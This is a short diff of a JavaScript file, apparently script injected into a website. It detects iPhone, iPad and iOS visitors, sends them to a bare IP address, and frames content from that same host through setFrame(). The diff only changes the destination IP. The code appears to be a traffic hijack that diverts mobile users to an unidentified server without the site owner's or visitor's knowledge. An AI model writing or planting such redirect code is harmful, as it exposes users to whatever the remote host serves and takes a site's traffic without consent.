@@ -1,10 +1,10 @@
 //lxxaicom
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.17/";
+    window.location.href = "http://38.26.195.19/";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.17/");
+setFrame("http://38.26.195.19/");
 
 
 
